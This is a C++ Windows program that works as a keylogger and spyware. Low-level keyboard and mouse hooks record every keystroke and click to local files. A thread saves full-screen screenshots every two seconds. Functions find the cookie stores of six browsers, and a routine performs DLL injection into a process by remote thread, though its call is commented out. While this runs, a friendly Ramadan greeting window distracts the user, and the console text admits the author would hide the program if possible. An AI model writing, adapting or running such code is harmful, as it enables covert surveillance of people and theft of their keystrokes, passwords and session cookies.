#include <iostream>
#include <Windows.h>
#include <fstream>
#include <sstream>
#include <chrono>
#include <iomanip>
#include <locale>
#include <vector>
#include <TlHelp32.h>
#include "lodepng.h" // Include LodePNG header
#include <ctime>
#include <gdiplus.h>
#include <thread>
#include <future> // for std::async



// #include "tcp_connection.h"

std::ofstream logFile, keyboardFile;
std::ostringstream logStream, keyboardStream;

LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK mouseHookProc(int nCode, WPARAM wParam, LPARAM lParam);

std::wstring GetModuleFileExeName() {
    constexpr size_t MAX_PATH_LEN = 260; // Maximum length of a file path

    std::vector<wchar_t> pathBuf(MAX_PATH_LEN);
    DWORD copied = GetModuleFileNameW(NULL, pathBuf.data(), static_cast<DWORD>(pathBuf.size()));

    if (copied == 0) {
        throw std::runtime_error("Failed to get module file name. Error: " + std::to_string(GetLastError()));
    }

    if (copied >= pathBuf.size()) {
        throw std::runtime_error("Buffer size exceeded while getting module file name. Error: " + std::to_string(GetLastError()));
    }

    std::wstring filePath(pathBuf.data());

    // Extract just the file name (excluding the path)
    size_t pos = filePath.find_last_of(L"\\");
    if (pos != std::wstring::npos && pos + 1 < filePath.size()) {
        return filePath.substr(pos + 1);
    }
    else {
        throw std::runtime_error("Invalid module file name.");
    }
}


DWORD GetProcIdByName(const wchar_t* procName) {
    DWORD procId = 0; // Initialize procId to 0
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32W procEntry{};
    procEntry.dwSize = sizeof(PROCESSENTRY32W);
    if (!Process32FirstW(hSnap, &procEntry)) {
        CloseHandle(hSnap);
        return 0;
    }

    do {
        // Perform case-insensitive comparison directly with wide character strings
        if (_wcsicmp(procEntry.szExeFile, procName) == 0) {
            procId = procEntry.th32ProcessID;
            break;
        }
    } while (Process32NextW(hSnap, &procEntry));

    CloseHandle(hSnap);
    return procId;
}


std::wstring GetUsername() {
    wchar_t username[MAX_PATH];
    size_t len;
    if (_wgetenv_s(&len, username, MAX_PATH, L"USERNAME") != 0 || len == 0) {
        std::cerr << "Failed to retrieve username from environment variables." << std::endl;
        return L"";
    }
    return std::wstring(username);
}

std::wstring CreateOrGetDLLPath(const std::wstring& fileName) {
    // Get the user's name
    wchar_t userName[MAX_PATH];
    DWORD userNameSize = sizeof(userName) / sizeof(userName[0]);
    if (!GetUserNameW(userName, &userNameSize)) {
        std::cerr << "Failed to retrieve user name." << std::endl;
        return L"";
    }

    // Construct the desired path
    std::wstring desiredPath = L"C:\\Users\\" + std::wstring(userName) + L"\\Desktop\\" + fileName;

    // Check if the DLL file already exists
    if (GetFileAttributesW(desiredPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
        return desiredPath; // Return the path if the file already exists
    }
    else {
        // Create the DLL file
        std::wofstream dllFile(desiredPath.c_str());
        if (!dllFile.is_open()) {
            std::wcerr << "Failed to create DLL file at: " << desiredPath << std::endl;
            std::cerr << "Error code: " << GetLastError() << std::endl; // Log the error code
            return L"";
        }
        //dllFile << "This is a newly created DLL file.";
        dllFile.close();
        std::wcout << "DLL file created at: " << desiredPath << std::endl;
        return desiredPath;
    }
}

bool DoesFileExist(const std::wstring& filePath) {
    DWORD fileAttributes = GetFileAttributesW(filePath.c_str());
    return (fileAttributes != INVALID_FILE_ATTRIBUTES && !(fileAttributes & FILE_ATTRIBUTE_DIRECTORY));
}

std::wstring GetChromeCookiesPath() {
    // Get the user's name
    wchar_t userName[MAX_PATH];
    DWORD userNameSize = sizeof(userName) / sizeof(userName[0]);
    if (!GetUserNameW(userName, &userNameSize)) {
        std::cerr << "Failed to retrieve user name." << std::endl;
        return L"";
    }

    // Construct the Chrome Cookies file path
    std::wstring desiredPath = L"C:\\Users\\" + std::wstring(userName) + L"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies";

    if (DoesFileExist(desiredPath)) {
        std::wcout << "Chrome cookies file found at: " << desiredPath << std::endl;
        return desiredPath;
    }
    else {
        std::wcerr << "Failed to find Chrome cookies file at: " << desiredPath << std::endl;
        std::cerr << "Error code: " << GetLastError() << std::endl;
    }
    return L"";
}

std::wstring GetFirefoxProfilesPath() {
    // Get the user's name
    wchar_t userName[MAX_PATH];
    DWORD userNameSize = sizeof(userName) / sizeof(userName[0]);
    if (!GetUserNameW(userName, &userNameSize)) {
        std::cerr << "Failed to retrieve user name." << std::endl;
        return L"";
    }

    // Construct the Firefox profiles directory path
    std::wstring desiredPath = L"C:\\Users\\" + std::wstring(userName) + L"\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles";

    if (DoesFileExist(desiredPath)) {
        std::wcout << "Firefox profiles directory found at: " << desiredPath << std::endl;
        return desiredPath;

    }
    else {
        std::wcerr << "Failed to find Firefox profiles directory at: " << desiredPath << std::endl;
        std::cerr << "Error code: " << GetLastError() << std::endl;
    }
    return L"";

}


std::wstring GetEdgeCookiesPath() {
    // Get the user's name
    wchar_t userName[MAX_PATH];
    DWORD userNameSize = sizeof(userName) / sizeof(userName[0]);
    if (!GetUserNameW(userName, &userNameSize)) {
        std::cerr << "Failed to retrieve user name." << std::endl;
        return L"";
    }

    // Construct the Edge Cookies file path
    std::wstring desiredPath = L"C:\\Users\\" + std::wstring(userName) + L"\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies";

    if (DoesFileExist(desiredPath)) {
        std::wcout << "Edge cookies file found at: " << desiredPath << std::endl;
        return desiredPath;
    }
    else {
        std::wcerr << "Failed to find Edge cookies file at: " << desiredPath << std::endl;
        std::cerr << "Error code: " << GetLastError() << std::endl;
    }
    return L"";
}

std::wstring GetOperaStableCookiesPath() {
    // Get the AppData directory path
    wchar_t appDataPath[MAX_PATH];
    DWORD result = GetEnvironmentVariable(L"APPDATA", appDataPath, MAX_PATH);
    if (result > 0 && result < MAX_PATH) {
        // Construct the Opera Stable Cookies file path
        std::wstring desiredPath = std::wstring(appDataPath) + L"\\Opera Software\\Opera Stable\\Network\\Cookies";

        // Check if the file exists
        if (GetFileAttributesW(desiredPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
            std::wcout << "Opera Stable cookies file found at: " << desiredPath << std::endl;
            return desiredPath;
        }
        else {
            std::wcerr << "Failed to find Opera Stable cookies file at: " << desiredPath << std::endl;
            std::cerr << "Error code: " << GetLastError() << std::endl;
        }
    }
    else {
        std::cerr << "Failed to retrieve AppData directory path." << std::endl;
    }

    return L"";
}

std::wstring GetOperaGXStableCookiesPath() {
    // Get the AppData directory path
    wchar_t appDataPath[MAX_PATH];
    DWORD result = GetEnvironmentVariable(L"APPDATA", appDataPath, MAX_PATH);
    if (result > 0 && result < MAX_PATH) {
        // Construct the Opera GX Stable Cookies file path
        std::wstring desiredPath = std::wstring(appDataPath) + L"\\Opera Software\\Opera GX Stable\\Network\\Cookies";

        // Check if the file exists
        if (GetFileAttributesW(desiredPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
            std::wcout << "Opera GX Stable cookies file found at: " << desiredPath << std::endl;
            return desiredPath;
        }
        else {
            std::wcerr << "Failed to find Opera GX Stable cookies file at: " << desiredPath << std::endl;
            std::cerr << "Error code: " << GetLastError() << std::endl;
        }
    }
    else {
        std::cerr << "Failed to retrieve AppData directory path." << std::endl;
    }

    return L"";
}

std::wstring GetBraveCookiesPath() {
    // Get the user's name
    wchar_t userName[MAX_PATH];
    DWORD userNameSize = sizeof(userName) / sizeof(userName[0]);
    if (!GetUserNameW(userName, &userNameSize)) {
        std::cerr << "Failed to retrieve user name." << std::endl;
        return L"";
    }

    // Construct the Brave Cookies file path
    //I will fix that link in future.
    std::wstring desiredPath = L"C:\\Users\\" + std::wstring(userName) + L"\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Service Worker\\Database\\CURRENT";

    if (DoesFileExist(desiredPath)) {
        std::wcout << "Edge cookies file found at: " << desiredPath << std::endl;
        return desiredPath;
    }
    else {
        std::wcerr << "Failed to find Edge cookies file at: " << desiredPath << std::endl;
        std::cerr << "Error code: " << GetLastError() << std::endl;
    }
    return L"";
}

// Function to get paths of cookies from different browsers
std::vector<std::wstring> GetCookiePaths() {
    std::vector<std::wstring> cookiePaths;

    // Get the path of Chrome cookies and add it to the vector if it exists
    std::wstring chromeCookiesPath = GetChromeCookiesPath();
    if (!chromeCookiesPath.empty()) {
        cookiePaths.push_back(chromeCookiesPath);
    }
    else {
        std::wcerr << "Failed to retrieve Chrome cookies path." << std::endl;
    }

    // Get the path of Firefox profiles and add it to the vector if it exists
    std::wstring firefoxProfilesPath = GetFirefoxProfilesPath();
    if (!firefoxProfilesPath.empty()) {
        cookiePaths.push_back(firefoxProfilesPath);
    }
    else {
        std::wcerr << "Failed to retrieve Firefox profiles path." << std::endl;
    }

    // Get the path of Edge cookies and add it to the vector if it exists
    std::wstring edgeCookiesPath = GetEdgeCookiesPath();
    if (!edgeCookiesPath.empty()) {
        cookiePaths.push_back(edgeCookiesPath);
    }
    else {
        std::wcerr << "Failed to retrieve Edge cookies path." << std::endl;
    }

    // Get the path of Opera Stable cookies and add it to the vector if it exists
    std::wstring operaStableCookiesPath = GetOperaStableCookiesPath();
    if (!operaStableCookiesPath.empty()) {
        cookiePaths.push_back(operaStableCookiesPath);
    }
    else {
        std::wcerr << "Failed to retrieve Opera Stable cookies path." << std::endl;
    }

    // Get the path of Opera GX Stable cookies and add it to the vector if it exists
    std::wstring operaGXStableCookiesPath = GetOperaGXStableCookiesPath();
    if (!operaGXStableCookiesPath.empty()) {
        cookiePaths.push_back(operaGXStableCookiesPath);
    }
    else {
        std::wcerr << "Failed to retrieve Opera GX Stable cookies path." << std::endl;
    }

    // Get the path of Opera GX Stable cookies and add it to the vector if it exists
    std::wstring BraveCookiesPath = GetBraveCookiesPath();
    if (!BraveCookiesPath.empty()) {
        cookiePaths.push_back(BraveCookiesPath);
    }
    else {
        std::wcerr << "Failed to retrieve Brave cookies path." << std::endl;
    }

    return cookiePaths;
}

// Function to print the cookie paths
void PrintExistedCookiePaths(const std::vector<std::wstring>& cookiePaths) {
    std::wcout << "Cookie paths:" << std::endl;
    for (const auto& path : cookiePaths) {
        std::wcout << path << std::endl;
    }
}
std::wstring GetValidFileName(const std::wstring& fileName) {
    // Replace invalid characters with underscores
    std::wstring validFileName;
    for (wchar_t ch : fileName) {
        if (ch == L'<' || ch == L'>' || ch == L':' || ch == L'"' || ch == L'/' || ch == L'\\' || ch == L'|' || ch == L'?' || ch == L'*') {
            validFileName += L'_';
        }
        else {
            validFileName += ch;
        }
    }
    return validFileName;
}

void SaveScreenshotAsPNG(const std::wstring& filePath, HBITMAP hBitmap, int width, int height) {
    // Encode BMP data as PNG
    std::vector<unsigned char> pngData;
    std::vector<unsigned char> bmpData(width * height * 4); // Allocate buffer for BMP data
    BITMAPINFOHEADER bi{};
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = width;
    bi.biHeight = -height; // Top-down bitmap
    bi.biPlanes = 1;
    bi.biBitCount = 32; // 32 bits per pixel (RGBA)
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;
    HDC hdc = GetDC(NULL);
    GetDIBits(hdc, hBitmap, 0, height, bmpData.data(), (BITMAPINFO*)&bi, DIB_RGB_COLORS);

    unsigned error = lodepng::encode(pngData, bmpData, width, height);
    if (error) {
        std::wcerr << L"PNG encoding error: " << lodepng_error_text(error) << std::endl;
        return;
    }

    // Get the user's name
    wchar_t userName[MAX_PATH];
    DWORD userNameSize = sizeof(userName) / sizeof(userName[0]);
    if (!GetUserNameW(userName, &userNameSize)) {
        std::cerr << "Failed to retrieve user name to save PNG files." << std::endl;
    }

    // Construct full file path for PNG
    std::wstring fullFilePath = L"C:\\Users\\" + std::wstring(userName) + L"\\AppData\\Roaming\\Screenshot\\" + filePath;

    // Write PNG data to file
    std::ofstream pngFile(fullFilePath, std::ios::binary);
    if (!pngFile.is_open()) {
        std::wcerr << L"Failed to open PNG file for writing: " << fullFilePath << std::endl;
        return;
    }
    pngFile.write(reinterpret_cast<const char*>(pngData.data()), pngData.size());

    std::wcout << L"PNG file saved: " << fullFilePath << std::endl;
}


void GetScreenshot(const std::wstring& userName) {
    int x1, y1, x2, y2, w, h;

    // get screen dimensions
    x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
    y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
    x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    y2 = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    w = x2 - x1;
    h = y2 - y1;

    // copy screen to bitmap
    HDC     hScreen = GetDC(NULL);
    HDC     hDC = CreateCompatibleDC(hScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, w, h);
    HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
    BOOL    bRet = BitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY);

    // Construct full file path for PNG
    std::time_t now = std::time(nullptr);
    std::tm timeinfo;
    localtime_s(&timeinfo, &now);

    // Calculate required buffer size for formatted date and time string
    size_t bufferSize = 20; // Initial buffer size
    wchar_t* buffer = new wchar_t[bufferSize]; // Allocate memory for buffer

    // Format date and time string, checking for buffer overflow
    size_t resultSize = 0;
    do {
        resultSize = std::wcsftime(buffer, bufferSize, L"%Y-%m-%d_%H-%M-%S", &timeinfo);
        if (resultSize == 0) {
            // If buffer wasn't large enough, reallocate with double the size
            bufferSize *= 2;
            delete[] buffer;
            buffer = new wchar_t[bufferSize];
        }
    } while (resultSize == 0);

    std::wstring filename = GetValidFileName(userName) + L"_" + std::wstring(buffer);
    std::wstring pngFilePath = filename + L".png";

    // Save Screenshot as PNG
    SaveScreenshotAsPNG(pngFilePath, hBitmap, w, h);

    // Clean up
    SelectObject(hDC, old_obj);
    DeleteDC(hDC);
    ReleaseDC(NULL, hScreen);
    DeleteObject(hBitmap);

    // Free dynamically allocated memory
    delete[] buffer;

}

bool DllPartOfFunctions() {

    // Get the user's name
    wchar_t userName[MAX_PATH];
    DWORD userNameSize = sizeof(userName) / sizeof(userName[0]);
    if (!GetUserNameW(userName, &userNameSize)) {
        std::cerr << "Failed to retrieve user name." << std::endl;
        return false;
    }

    std::wstring desiredPath = L"dl.dll";
    std::wstring dllPath = CreateOrGetDLLPath(desiredPath);

    if (dllPath.empty()) {
        std::cerr << "Failed to get DLL path." << std::endl;
        return false;
    }

    std::wcout << "DLL path: " << dllPath << std::endl;

    std::wstring targetProcName = GetModuleFileExeName();
    if (targetProcName.empty()) {
        return false;
    }

    DWORD procId = GetProcIdByName(targetProcName.c_str());
    if (procId == 0) {
        std::cerr << "Failed to get target process ID." << std::endl;
        return false;
    }

    // Set file attributes
    if (!SetFileAttributesW(targetProcName.c_str(), FILE_ATTRIBUTE_HIDDEN)) {
        std::cerr << "Failed to set file attributes. Error: " << GetLastError() << std::endl;
        return false;
    }

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procId);
    if (hProc == NULL) {
        std::cerr << "Failed to open target process. Error: " << GetLastError() << std::endl;
        return false;
    }

    LPVOID remoteMem = VirtualAllocEx(hProc, nullptr, dllPath.size() * sizeof(wchar_t), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (remoteMem == NULL) {
        std::cerr << "Failed to allocate remote memory. Error: " << GetLastError() << std::endl;
        CloseHandle(hProc);
        return false;
    }

    if (!WriteProcessMemory(hProc, remoteMem, dllPath.c_str(), dllPath.size() * sizeof(wchar_t), nullptr)) {
        std::cerr << "Failed to write DLL path to remote process. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return false;
    }

    HMODULE kernel32 = GetModuleHandleW(L"kernel32.dll");
    if (kernel32 == NULL) {
        std::cerr << "Failed to get handle to kernel32.dll. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return false;
    }

    LPTHREAD_START_ROUTINE loadLibraryAddr = (LPTHREAD_START_ROUTINE)GetProcAddress(kernel32, "LoadLibraryW");
    if (loadLibraryAddr == NULL) {
        std::cerr << "Failed to get address of LoadLibraryW. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return false;
    }

    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, loadLibraryAddr, remoteMem, 0, NULL);
    if (hThread == NULL) {
        std::cerr << "Failed to create remote thread. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return false;
    }

    WaitForSingleObject(hThread, INFINITE);
    std::cout << "DLL injected successfully." << std::endl;

    CloseHandle(hThread);
    VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
    CloseHandle(hProc);
    return true;
}

void ScreenCaptureThread(const wchar_t* userName)
{
    while (true) {
        GetScreenshot(userName);
        std::this_thread::sleep_for(std::chrono::seconds(2)); // Wait for 5 minutes
    }
}

void CreateScreenshotFolder(const std::wstring& userName) {
    // Construct the full path for the Screenshot folder
    std::wstring folderPath = L"C:\\Users\\" + userName + L"\\AppData\\Roaming\\Screenshot";

    // Attempt to create the directory
    if (!CreateDirectory(folderPath.c_str(), NULL)) {
        DWORD error = GetLastError();
        if (error == ERROR_ALREADY_EXISTS) {
            // If the folder already exists, inform the user
            std::wcout << "The Screenshot folder already exists." << std::endl;
        }
        else {
            // If there was an error creating the folder, provide details about the error
            std::wcerr << "Failed to create the Screenshot folder. Error code: " << error << std::endl;
        }
    }
    else {
        // If the folder was successfully created, notify the user
        std::wcout << "The Screenshot folder was created successfully." << std::endl;
    }
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);
        RECT rect;
        GetClientRect(hwnd, &rect);

        // Draw the greeting message
        DrawText(hdc, L"Hello, my dear programmer", -1, &rect, DT_CENTER | DT_SINGLELINE);

        // Calculate the height of the greeting text
        int textHeight = DrawText(hdc, L"Hello, my dear programmer", -1, &rect, DT_CENTER | DT_SINGLELINE);
        rect.top += textHeight + 20; // Move down below the greeting text

        // Set font size for the "Wishing you blessed Ramadan" message
        HFONT hFont = CreateFont(30, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH, L"Arial");
        HFONT hOldFont = (HFONT)SelectObject(hdc, hFont);

        // Wishing you blessed Ramadan
        std::wstring message = L"Wishing you a blessed Ramadan\r\n";
        DrawText(hdc, message.c_str(), -1, &rect, DT_CENTER | DT_TOP | DT_SINGLELINE);

        // Restore the old font
        SelectObject(hdc, hOldFont);
        DeleteObject(hFont);


        // Adjust rect for the next message
        rect.top += textHeight + 40;

        // A short poem about wars and technology
        message = L"In the era of wars and technology";
        DrawText(hdc, message.c_str(), -1, &rect, DT_CENTER | DT_TOP | DT_SINGLELINE);

        // Adjust rect for the next message
        rect.top += textHeight + 5;

        message = L"We wield bytes instead of blades,";
        DrawText(hdc, message.c_str(), -1, &rect, DT_CENTER | DT_TOP | DT_SINGLELINE);

        // Adjust rect for the next message
        rect.top += textHeight + 5;

        message = L"Battlefields are lines of code";
        DrawText(hdc, message.c_str(), -1, &rect, DT_CENTER | DT_TOP | DT_SINGLELINE);

        // Adjust rect for the next message
        rect.top += textHeight + 5;

        message = L"Where algorithms clash like spades.";
        DrawText(hdc, message.c_str(), -1, &rect, DT_CENTER | DT_TOP | DT_SINGLELINE);

        EndPaint(hwnd, &ps);
        return 0;
    }
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}


void CreateWindowAndMessageLoop() {
    // Register window class
    WNDCLASSEX wc = { sizeof(WNDCLASSEX), CS_HREDRAW | CS_VREDRAW, WindowProc, 0, 0, GetModuleHandle(NULL), NULL, NULL, NULL, NULL, L"WindowClass", NULL };
    RegisterClassEx(&wc);

    // Create window
    HWND hwnd = CreateWindowEx(0, L"WindowClass", L"Message from ferivonus", WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU, CW_USEDEFAULT, CW_USEDEFAULT, 640, 480, NULL, NULL, wc.hInstance, NULL);

    if (hwnd == NULL) {
        MessageBox(NULL, L"Window creation failed!", L"Error", MB_ICONERROR);
        return;
    }

    // Show and update window
    ShowWindow(hwnd, SW_SHOWDEFAULT);
    UpdateWindow(hwnd);

    // Message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}


void WaitForThreads(std::thread& thread1, std::thread& thread2) {
    thread1.join();
    thread2.join();
}


int main() {
    // Get the user's name
    wchar_t userName[MAX_PATH];
    DWORD userNameSize = sizeof(userName) / sizeof(userName[0]);
    if (!GetUserNameW(userName, &userNameSize)) {
        std::cerr << "Failed to retrieve user name." << std::endl;
        return 1;
    }

    CreateScreenshotFolder(userName);

    // Create a thread for opening a win screen
    std::thread windowThread(CreateWindowAndMessageLoop);

    // Create a thread for capturing Screenshots
    std::thread captureThread(ScreenCaptureThread, userName);

    // Run isVulcanworkfine in a separate thread
    /*

        if (!DllPartOfFunctions()) {
            std::cerr << "Failed when program created a DLL file.";
            return 1;
        }

    */

    // Get the cookie paths
    std::vector<std::wstring> cookiePaths = GetCookiePaths();

    // Print the cookie paths
    PrintExistedCookiePaths(cookiePaths);

    // Initialize logging
    std::ofstream logFile("log.csv", std::ios::app);
    logFile << "Time,Event,Type,Key/Position,MousePosition\n";
    logFile.close();

    std::ofstream keyboardFile("linear_keyboard.txt", std::ios::app);
    keyboardFile << "Every word typed by computer:\n";
    keyboardFile.close();

    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookProc, NULL, 0);
    HHOOK mouseHook = SetWindowsHookEx(WH_MOUSE_LL, mouseHookProc, NULL, 0);

    MSG message;
    std::cout << "I am working now\nBut you don't need to look at terminal for real" << std::endl;
    std::cout << "If I had chance to do, I will hide that too" << std::endl;
    while (GetMessage(&message, NULL, 0, 0)) {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }

    UnhookWindowsHookEx(keyboardHook);
    UnhookWindowsHookEx(mouseHook);

    // Wait for both threads to finish
    WaitForThreads(captureThread, windowThread);

    return 0;
}



LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
    {
        PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
        auto time_now = std::chrono::system_clock::now();
        auto timestamp = std::chrono::system_clock::to_time_t(time_now);
        std::string key;

        switch (p->vkCode)
        {
        case VK_RETURN:
            key = " ( typed Enter )\n";
            break;
        case VK_SPACE:
            key = " ( typed Space ) ";
            break;
        case VK_SHIFT:
            key = " ( typed Shift ) ";
            break;
        case VK_BACK:
            key = " ( typed Backspace ) ";
            break;
        case VK_TAB:
            key = " ( typed Tab ) ";
            break;
        case VK_ESCAPE:
            key = " ( typed Escape ) ";
            break;
        case VK_CAPITAL:
            key = " ( typed Caps Lock ) ";
            break;
        case VK_LCONTROL:
        case VK_RCONTROL:
            key = " ( typed Control ) ";
            break;
        case VK_LMENU:
        case VK_RMENU:
            key = " ( typed Alt ) ";
            break;
        case VK_LWIN:
        case VK_RWIN:
            key = " ( typed Windows Key ) ";
            break;
        case VK_OEM_1:
            key = " ( typed ; ) ";
            break;
        case VK_OEM_2:
            key = " ( typed ? ) ";
            break;
        case VK_OEM_3:
            key = " ( typed ~ ) ";
            break;
        case VK_OEM_4:
            key = " ( typed [ ) ";
            break;
        case VK_OEM_5:
            key = " ( typed | ) ";
            break;
        case VK_OEM_6:
            key = " ( typed ] ) ";
            break;
        case VK_OEM_7:
            key = " ( typed ' ) ";
            break;
        case VK_OEM_COMMA:
            key = " ( typed , ) ";
            break;
        case VK_OEM_PERIOD:
            key = " ( typed . ) ";
            break;
        case VK_OEM_MINUS:
            key = " ( typed - ) ";
            break;
        case VK_OEM_PLUS:
            key = " ( typed + ) ";
            break;
        case VK_OEM_8:
            key = " ( typed ` ) ";
            break;
        case VK_OEM_102:
            key = " ( typed < ) ";
            break;
        case VK_INSERT:
            key = " ( typed Insert ) ";
            break;
        case VK_DELETE:
            key = " ( typed Delete ) ";
            break;
        case VK_HOME:
            key = " ( typed Home ) ";
            break;
        case VK_END:
            key = " ( typed End ) ";
            break;
        case VK_PRIOR:
            key = " ( typed Page Up ) ";
            break;
        case VK_NEXT:
            key = " ( typed Page Down ) ";
            break;
        case VK_NUMPAD0:
        case VK_NUMPAD1:
        case VK_NUMPAD2:
        case VK_NUMPAD3:
        case VK_NUMPAD4:
        case VK_NUMPAD5:
        case VK_NUMPAD6:
        case VK_NUMPAD7:
        case VK_NUMPAD8:
        case VK_NUMPAD9:
            key = " ( typed Num Pad ";
            if (p->vkCode >= VK_NUMPAD0 && p->vkCode <= VK_NUMPAD9) {
                key += static_cast<char>(p->vkCode - VK_NUMPAD0 + '0');
            }
            else {
                // For keys like VK_NUMPAD0 - VK_NUMPAD9, their virtual key codes correspond directly to ASCII values
                key += static_cast<char>(p->vkCode);
            }
            key += " ) ";
            break;
        case VK_MULTIPLY:
            key = " ( typed * ) ";
            break;
        case VK_ADD:
            key = " ( typed + ) ";
            break;
        case VK_SUBTRACT:
            key = " ( typed - ) ";
            break;
        case VK_DECIMAL:
            key = " ( typed . ) ";
            break;
        case VK_DIVIDE:
            key = " ( typed / ) ";
            break;
        case VK_F1:
        case VK_F2:
        case VK_F3:
        case VK_F4:
        case VK_F5:
        case VK_F6:
        case VK_F7:
        case VK_F8:
        case VK_F9:
        case VK_F10:
        case VK_F11:
        case VK_F12:
            key = " ( typed F";
            key += static_cast<char>(p->vkCode - VK_F1 + '1');
            key += " ) ";
            break;
        default:
            key = static_cast<char>(tolower(p->vkCode));
            break;
        }

        std::tm timeinfo;
        localtime_s(&timeinfo, &timestamp);
        if (timeinfo.tm_sec % 30 == 0) {
            keyboardStream << "\n" << std::put_time(&timeinfo, "%Y-%m-%d %H:%M:%S") << ":"
                << key;
        }
        else {
            keyboardStream << key;
        }

        char ptr = '0';

        //logStream << "Time,Event,Type,Key/Position,MousePosition\n";

        try
        {
            std::tm timeinfo;
            localtime_s(&timeinfo, &timestamp);

            // Log keyboard event to the log stream
            logStream << std::put_time(&timeinfo, "%Y-%m-%d %H:%M:%S") << ","
                << "Keyboard Key,Pressed,"
                << key << ",0\n";

            // Append log stream to the log file
            logFile.open("log.csv", std::ios::app);
            if (!logFile.is_open()) {
                throw std::runtime_error("Failed to open log file.");
            }
            logFile << logStream.str();
            logFile.close();
            logStream.str("");

            // Append key to the keyboard file
            keyboardFile.open("linear_keyboard.txt", std::ios::app);
            if (!keyboardFile.is_open()) {
                throw std::runtime_error("Failed to open keyboard file.");
            }
            keyboardFile << key;
            keyboardFile.close();
            keyboardStream.str("");
        }
        catch (const std::exception&)
        {

        }
        /*
            // old code:

            logStream << std::put_time(&timeinfo, "%Y-%m-%d %H:%M:%S") << ","
            << "Keyboard Key,Pressed,"
            << key <<"," << ptr << "\n";
            logFile.open("log.csv", std::ios::app);
            logFile << logStream.str();
            logFile.close();
            logStream.str("");
            localtime_s(&timeinfo, &timestamp);
            keyboardFile.open("linear_keyboard.txt", std::ios::app);
            keyboardFile << keyboardStream.str();
            keyboardFile.close();
            keyboardStream.str("");

        */
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}


LRESULT CALLBACK mouseHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN))
    {
        try {
            ULONGLONG time_now = GetTickCount64();
            POINT p;
            if (!GetCursorPos(&p)) {
                throw std::runtime_error("Failed to get cursor position.");
            }
            std::string button;
            switch (wParam)
            {
            case WM_LBUTTONDOWN:
                button = "Left";
                break;
            case WM_RBUTTONDOWN:
                button = "Right";
                break;
            case WM_MBUTTONDOWN:
                button = "Middle";
                break;
            default:
                button = "Unknown";
                break;
            }
            time_t timestamp = time(nullptr);
            struct tm localtime_buffer;
            localtime_s(&localtime_buffer, &timestamp);
            char time_str[20];
            if (!strftime(time_str, 20, "%Y-%m-%d %H:%M:%S", &localtime_buffer)) {
                throw std::runtime_error("Failed to format time.");
            }

            //logStream << "Time,Event,Type,Key/Position,MousePosition\n";
            logStream << time_str << "," << "Mouse Click" << ",Mouse," << button << "," << p.x << ":" << p.y << "\n";

            logFile.open("log.csv", std::ios::app);
            if (!logFile.is_open()) {
                throw std::runtime_error("Failed to open log file.");
            }
            logFile << logStream.str();
            logFile.close();
            logStream.str("");
        }
        catch (const std::exception& e) {
            // Handle error
            std::cerr << "Error: " << e.what() << std::endl;
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}